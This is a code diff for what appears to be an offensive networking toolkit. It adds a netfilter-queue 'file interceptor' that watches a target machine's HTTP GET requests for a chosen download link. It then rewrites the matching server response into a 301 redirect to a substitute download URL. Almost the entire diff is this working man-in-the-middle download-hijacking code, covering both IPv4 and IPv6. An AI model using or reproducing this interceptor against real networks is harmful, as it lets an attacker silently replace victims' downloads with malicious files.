@@ -5,21 +5,108 @@
 #include <unistd.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
+#include <netinet/ip6.h>
 #include <netinet/tcp.h>
 #include <linux/netfilter.h>
 #include <poll.h>
 #include <cstring>
 
- static int nfq_send_verdict(int queue_num, uint32_t id, mnl_socket* nl)
+static bool32 FilterTCPReq(const char* downloadLink, tcphdr* tcpHeader, char* payload, uint32_t& reqAckNum)
+{
+    uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
+    if(res == PC_HTTP_REQUEST)
+    {
+        if(PacketCraft::GetHTTPMethod((uint8_t*)payload) == PC_HTTP_GET)
+        {
+            char packetFileName[255]{};
+            char packetDomainName[255]{};
+            char packetDownloadLink[1024]{};
+
+            char buffer[255]{};
+
+            // Copy the first line of the http request in buffer. Should be something like this: "GET /test/file.php HTTP/1.1"
+            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload, '\n');
+
+            int filePathStartIndex = 4;
+            int filePathEndIndex = PacketCraft::FindInStr(buffer, " HTTP");
+            memcpy(packetFileName, buffer + filePathStartIndex, filePathEndIndex - filePathStartIndex);
+            memset(buffer, '\0', sizeof(buffer));
+            packetFileName[filePathEndIndex] = '\0';
+
+            // Copy the line containing the host domain name in buffer. Should be something like this: "Host: example.test.com"
+            // TODO: Host may be written in capital letters! Need to add support for that!
+            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload + PacketCraft::FindInStr(payload, "Host: "), '\n');
+
+            int domainStartIndex = 6;
+            int domainEndIndex = PacketCraft::FindInStr(buffer, "\r\n");
+            memcpy(packetDomainName, buffer + domainStartIndex, domainEndIndex - domainStartIndex);
+            memset(buffer, '\0', sizeof(buffer));
+            packetDomainName[domainEndIndex] = '\0';
+
+            PacketCraft::ConcatStr(packetDownloadLink, sizeof(packetDownloadLink), packetDomainName, packetFileName);
+
+            if(PacketCraft::CompareStr(packetDownloadLink, downloadLink) == TRUE)
+            {
+                reqAckNum = tcpHeader->ack_seq;
+                return TRUE;
+            }
+        }
+    }
+    return FALSE;
+}
+
+static bool32 FilterTCPRes(tcphdr* tcpHeader, char* payload, uint32_t requestAckNum)
+{
+    uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
+    if(res == PC_HTTP_RESPONSE)
+    {
+        if(tcpHeader->seq == requestAckNum)
+            return TRUE;
+    }
+    return FALSE;
+}
+
+static int ManglePacket(uint32_t ipVersion, const char* newDownloadLink, pkt_buff* pkBuff, uint32_t matchOffset, uint32_t matchLen)
+{
+    // create new payload
+    char httpResponse[1024]{};
+    const char* httpStatusCode = "HTTP/1.1 301 Moved Permanently\r\nLocation: ";
+    uint32_t responseCodeLen = PacketCraft::GetStrLen(httpStatusCode) + PacketCraft::GetStrLen(newDownloadLink) + 1;
+    PacketCraft::ConcatStr(httpResponse, responseCodeLen, httpStatusCode, newDownloadLink);
+    //////////
+
+    if(ipVersion == AF_INET)
+    {
+        if(nfq_tcp_mangle_ipv4(pkBuff, matchOffset, matchLen, httpResponse, responseCodeLen) < 0)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
+            return APPLICATION_ERROR;
+        }
+    }
+    else
+    {
+        if(nfq_tcp_mangle_ipv6(pkBuff, matchOffset, matchLen, httpResponse, responseCodeLen) < 0)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
+            return APPLICATION_ERROR;
+        }
+    }
+
+    return NO_ERROR;
+}
+
+ static int nfq_send_verdict(int queue_num, uint32_t id, mnl_socket* nl, pkt_buff* pkBuff)
  {
     char buf[MNL_SOCKET_BUFFER_SIZE];
     nlmsghdr* nlh;
     nlattr* nest;
 
     nlh = nfq_nlmsg_put(buf, NFQNL_MSG_VERDICT, queue_num);
+
+    if(pktb_mangled(pkBuff))
+        nfq_nlmsg_verdict_put_pkt(nlh, pktb_data(pkBuff), pktb_len(pkBuff));
+
     nfq_nlmsg_verdict_put(nlh, id, NF_ACCEPT);
-
-
 
     /* example to set the connmark. First, start NFQA_CT section: */
     nest = mnl_attr_nest_start(nlh, NFQA_CT);
@@ -40,13 +127,15 @@
     return NO_ERROR;
  }
 
- static int queueCallback(const nlmsghdr *nlh, void *data)
- {
+bool32 reqFiltered{FALSE};
+uint32_t reqAckNum{0};
+static int queueCallback(const nlmsghdr *nlh, void *data)
+{
     nfqnl_msg_packet_hdr* ph{nullptr};
     nlattr* attr[NFQA_MAX + 1]{};
     nfgenmsg*nfg{nullptr};
 
-    mnl_socket* nl = (mnl_socket*)data;
+    CHaks::NetFilterCallbackData callbackData = *(CHaks::NetFilterCallbackData*)data;
 
     if(nfq_nlmsg_parse(nlh, attr) < 0) 
     {
@@ -104,25 +193,186 @@
 
     if(ipVersion == AF_INET)
     {
+        ipv4Header = nfq_ip_get_hdr(pkBuff);
+        if(ipv4Header == nullptr)
+        {
+            pktb_free(pkBuff);
+            LOG_ERROR(APPLICATION_ERROR, "pktb_network_header() error");
+            return MNL_CB_ERROR;
+        }
 
+        if(nfq_ip_set_transport_header(pkBuff, ipv4Header) < 0)
+        {
+            pktb_free(pkBuff);
+            LOG_ERROR(APPLICATION_ERROR, "nfq_ip_set_transport_header() error");
+            return MNL_CB_ERROR;
+        }
+
+        if(ipv4Header->protocol == IPPROTO_TCP)
+        {
+            // make sure that the packet IPs matches with the desired target IP
+            if(reqFiltered == FALSE)
+            {
+                sockaddr_in targetAddr{};
+                inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
+                if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
+                {
+                    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
+                    {
+                        pktb_free(pkBuff);
+                        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
+                        return MNL_CB_ERROR;
+                    }
+                    return MNL_CB_OK;
+                }
+            }
+            else
+            {
+                sockaddr_in targetAddr{};
+                inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
+                if(targetAddr.sin_addr.s_addr != ipv4Header->daddr)
+                {
+                    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
+                    {
+                        pktb_free(pkBuff);
+                        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
+                        return MNL_CB_ERROR;
+                    }
+                    return MNL_CB_OK;
+                }
+            }
+            //////////////////////////
+        }
+        else    
+        {
+            if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
+            {
+                pktb_free(pkBuff);
+                LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
+                return MNL_CB_ERROR;
+            }
+            return MNL_CB_OK;
+        }
     }
     else if(ipVersion == AF_INET6)
     {
+        ipv6Header = nfq_ip6_get_hdr(pkBuff);
+        if(ipv6Header == nullptr)
+        {
+            pktb_free(pkBuff);
+            LOG_ERROR(APPLICATION_ERROR, "nfq_ip6_get_hdr()");
+            return MNL_CB_ERROR;
+        }
 
+        int res = nfq_ip6_set_transport_header(pkBuff, ipv6Header, IPPROTO_TCP);
+        if(res == 1)
+        {
+            // make sure that the packet IPs matches with the desired target IP
+            if(reqFiltered == FALSE)
+            {
+                sockaddr_in6 targetAddr{};
+                inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
+                if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
+                {
+                    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
+                    {
+                        pktb_free(pkBuff);
+                        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
+                        return MNL_CB_ERROR;
+                    }
+                    return MNL_CB_OK;
+                }
+            }
+            else
+            {
+                sockaddr_in6 targetAddr{};
+                inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);  
+                if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
+                {
+                    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
+                    {
+                        pktb_free(pkBuff);
+                        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
+                        return MNL_CB_ERROR;
+                    }
+                    return MNL_CB_OK;
+                }
+            }
+            //////////
+        }
+        else if(res < 0) // no TCP layer in packet
+        {
+            if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
+            {
+                pktb_free(pkBuff);
+                LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
+                return MNL_CB_ERROR;
+            }
+            return MNL_CB_OK;
+        }
     }
 
+    tcpHeader = nfq_tcp_get_hdr(pkBuff);
+    if(tcpHeader == nullptr)
+    {
+        pktb_free(pkBuff);
+        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_hdr");
+        return MNL_CB_ERROR;
+    }
 
+    void *tcpPayload = nfq_tcp_get_payload(tcpHeader, pkBuff);
+    if(tcpPayload == nullptr)
+    {
+        pktb_free(pkBuff);
+        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_payload() error");
+        return MNL_CB_ERROR;
+    }
 
-    printf("packet received (id=%u hw=0x%04x hook=%u, payload len %u", ntohl(ph->packet_id), ntohs(ph->hw_protocol), ph->hook, plen);
+    // payload len includes the header and options size, so we need to subtract those
+    unsigned int tcpPayloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
+    if(tcpPayloadLen > 4 * tcpHeader->th_off)
+        tcpPayloadLen -= 4 * tcpHeader->th_off;
+    else
+        tcpPayloadLen = 0;
+    
+    if(reqFiltered == FALSE) // filter for the correct request and get its ack number
+    {
+        std::cout << "filtering request...\n";
+        if(FilterTCPReq(callbackData.downloadLink, tcpHeader, (char*)tcpPayload, reqAckNum) == TRUE)
+        {
+            reqFiltered = TRUE;
+        }
+    }
+    else // filter for the correct response. the seq num must match the request ack num
+    {
+        std::cout << "filtering response...\n";
+        if(FilterTCPRes(tcpHeader, (char*)tcpPayload, reqAckNum) == TRUE)
+        {
+            if(ManglePacket(ipVersion, callbackData.newDownloadLink, pkBuff, 4 * tcpHeader->th_off, tcpPayloadLen) == APPLICATION_ERROR)
+            {
+                pktb_free(pkBuff);
+                reqFiltered = FALSE;
+                reqAckNum = 0;
+                LOG_ERROR(APPLICATION_ERROR, "ManglePacket() error");
+                return MNL_CB_ERROR;
+            }
 
-    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), nl) == APPLICATION_ERROR)
+            std::cout << "response mangled\n";
+            reqFiltered = FALSE;
+            reqAckNum = 0;
+        }
+    }
+
+    printf("packet received (id=%u hw=0x%04x hook=%u, payload len %u\n", ntohl(ph->packet_id), ntohs(ph->hw_protocol), ph->hook, plen);
+
+    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
         return MNL_CB_ERROR;
     }
 
     return MNL_CB_OK;
- }
+}
 
 CHaks::FileInterceptor::FileInterceptor() :
     requestAckNum(0),
@@ -232,7 +482,7 @@ int CHaks::FileInterceptor::Init(const uint32_t ipVersion, const char* interface
     return NO_ERROR;
 }
 
-int CHaks::FileInterceptor::RunTest()
+int CHaks::FileInterceptor::Run()
 {
     char* buffer{nullptr};
     nlmsghdr* nlh{nullptr};
@@ -240,26 +490,26 @@ int CHaks::FileInterceptor::RunTest()
     size_t bufferSize = 0xffff + (MNL_SOCKET_BUFFER_SIZE/2);
     int res;
 
-    nl = mnl_socket_open(NETLINK_NETFILTER);
-    if(nl == nullptr)
+    callbackData.nl = mnl_socket_open(NETLINK_NETFILTER);
+    if(callbackData.nl == nullptr)
     {
         LOG_ERROR(APPLICATION_ERROR, "mnl_socket_open() error");
         return APPLICATION_ERROR;
     }
 
-    if(mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) 
+    if(mnl_socket_bind(callbackData.nl, 0, MNL_SOCKET_AUTOPID) < 0) 
     {
-        mnl_socket_close(nl);
+        mnl_socket_close(callbackData.nl);
         LOG_ERROR(APPLICATION_ERROR, "mnl_socket_bind() error");
         return APPLICATION_ERROR;
     }
 
-    portId = mnl_socket_get_portid(nl);
+    portId = mnl_socket_get_portid(callbackData.nl);
 
     buffer = (char*)malloc(bufferSize);
     if(!buffer) 
     {
-        mnl_socket_close(nl);
+        mnl_socket_close(callbackData.nl);
         LOG_ERROR(APPLICATION_ERROR, "malloc() error");
         return APPLICATION_ERROR;
     }
@@ -267,7 +517,7 @@ int CHaks::FileInterceptor::RunTest()
     nlh = nfq_nlmsg_put(buffer, NFQNL_MSG_CONFIG, queueNum);
     if(nlh == nullptr)
     {
-        mnl_socket_close(nl);
+        mnl_socket_close(callbackData.nl);
         free(buffer);
         LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_put() error");
         return APPLICATION_ERROR;
@@ -275,9 +525,9 @@ int CHaks::FileInterceptor::RunTest()
 
     nfq_nlmsg_cfg_put_cmd(nlh, ipVersion, NFQNL_CFG_CMD_BIND);
 
-    if(mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) 
+    if(mnl_socket_sendto(callbackData.nl, nlh, nlh->nlmsg_len) < 0) 
     {
-        mnl_socket_close(nl);
+        mnl_socket_close(callbackData.nl);
         free(buffer);
         LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
         return APPLICATION_ERROR;
@@ -286,7 +536,7 @@ int CHaks::FileInterceptor::RunTest()
     nlh = nfq_nlmsg_put(buffer, NFQNL_MSG_CONFIG, queueNum);
     if(nlh == nullptr)
     {
-        mnl_socket_close(nl);
+        mnl_socket_close(callbackData.nl);
         free(buffer);
         LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_put() error");
         return APPLICATION_ERROR;
@@ -296,9 +546,9 @@ int CHaks::FileInterceptor::RunTest()
     mnl_attr_put_u32(nlh, NFQA_CFG_FLAGS, htonl(NFQA_CFG_F_GSO));
     mnl_attr_put_u32(nlh, NFQA_CFG_MASK, htonl(NFQA_CFG_F_GSO));
 
-    if(mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) 
+    if(mnl_socket_sendto(callbackData.nl, nlh, nlh->nlmsg_len) < 0) 
     {
-        mnl_socket_close(nl);
+        mnl_socket_close(callbackData.nl);
         free(buffer);
         LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
         return APPLICATION_ERROR;
@@ -309,12 +559,12 @@ int CHaks::FileInterceptor::RunTest()
     * in this information, so turn it off.
     */
     res = 1;
-    mnl_socket_setsockopt(nl, NETLINK_NO_ENOBUFS, &res, sizeof(int));
+    mnl_socket_setsockopt(callbackData.nl, NETLINK_NO_ENOBUFS, &res, sizeof(int));
 
     pollfd pollFds[2]{-1, -1};
     pollFds[0].fd = 0;
     pollFds[0].events = POLLIN;
-    pollFds[1].fd = mnl_socket_get_fd(nl);
+    pollFds[1].fd = mnl_socket_get_fd(callbackData.nl);
     pollFds[1].events = POLLIN;
 
     while(true)
@@ -322,26 +572,26 @@ int CHaks::FileInterceptor::RunTest()
         int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), -1);
         if(nEvents == -1)
         {
-            mnl_socket_close(nl);
+            mnl_socket_close(callbackData.nl);
             free(buffer);
             LOG_ERROR(APPLICATION_ERROR, "poll() error");
             return APPLICATION_ERROR;
         }
         else if(pollFds[1].revents & POLLIN) // we have a packet in the queue
         {
-            res = mnl_socket_recvfrom(nl, buffer, bufferSize);
+            res = mnl_socket_recvfrom(callbackData.nl, buffer, bufferSize);
             if (res == -1) 
             {
-                mnl_socket_close(nl);
+                mnl_socket_close(callbackData.nl);
                 free(buffer);
                 LOG_ERROR(APPLICATION_ERROR, "mnl_socket_recvfrom() error");
                 return APPLICATION_ERROR;
             }
 
-            res = mnl_cb_run(buffer, res, 0, portId, queueCallback, nl);
+            res = mnl_cb_run(buffer, res, 0, portId, queueCallback, &callbackData);
             if (res < 0)
             {
-                mnl_socket_close(nl);
+                mnl_socket_close(callbackData.nl);
                 free(buffer);
                 LOG_ERROR(APPLICATION_ERROR, "mnl_cb_run() error");
                 return APPLICATION_ERROR;
@@ -353,7 +603,7 @@ int CHaks::FileInterceptor::RunTest()
         }
         else
         {
-            mnl_socket_close(nl);
+            mnl_socket_close(callbackData.nl);
             free(buffer);
             LOG_ERROR(APPLICATION_ERROR, "unknown poll() error!");
             return APPLICATION_ERROR;
@@ -361,78 +611,7 @@ int CHaks::FileInterceptor::RunTest()
 
     }
 
-    mnl_socket_close(nl);
+    mnl_socket_close(callbackData.nl);
     free(buffer);
-    return NO_ERROR;
-}
-
-int CHaks::FileInterceptor::Run(int (*netfilterCallbackFunc)(nfq_q_handle*, nfgenmsg*, nfq_data*, void*))
-{
-    handler = nfq_open();
-    if(handler == nullptr)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "nfq_open() error");
-        return APPLICATION_ERROR;
-    }
-
-    queue = nfq_create_queue(handler, queueNum, netfilterCallbackFunc, &callbackData);
-    if(queue == nullptr)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "nfq_create_queue() error");
-        return APPLICATION_ERROR;
-    }
-
-    if(nfq_set_mode(queue, NFQNL_COPY_PACKET, IP_MAXPACKET) < 0)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "nfq_set_mode() error");
-        return APPLICATION_ERROR;
-    }
-
-    int socketFd = nfq_fd(handler);
-    char buffer[IP_MAXPACKET]{}; // TODO: can we use a PacketCraft::Packet here and pass it to the nfq_handle_packet?
-    struct pollfd pollFds[2];
-
-    pollFds[0].fd = 0;
-    pollFds[0].events = POLLIN;
-    pollFds[1].fd = socketFd;
-    pollFds[1].events = POLLIN;
-
-    std::cout << "running...press enter to stop" << std::endl;
-
-    while(true)
-    {
-        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), -1);
-        if(nEvents == -1)
-        {
-            close(socketFd);
-            LOG_ERROR(APPLICATION_ERROR, "poll() error");
-            return APPLICATION_ERROR;
-        }
-        else if(pollFds[1].revents & POLLIN) // we have a packet in the queue
-        {
-            int len = read(pollFds[1].fd, buffer, IP_MAXPACKET);
-            if(len < 0)
-            {
-                close(socketFd);
-                LOG_ERROR(APPLICATION_ERROR, "read() error");
-                return APPLICATION_ERROR;
-            }
-
-            nfq_handle_packet(handler, buffer, len);
-        }
-        else if(pollFds[0].revents & POLLIN) // user hit a key and wants to quit program
-        {
-            break;
-        }
-        else
-        {
-            close(socketFd);
-            LOG_ERROR(APPLICATION_ERROR, "unknown poll() error!");
-            return APPLICATION_ERROR;
-        }
-    }
-
-    close(socketFd);
-    std::cout << "quitting..." << std::endl;
     return NO_ERROR;
 }
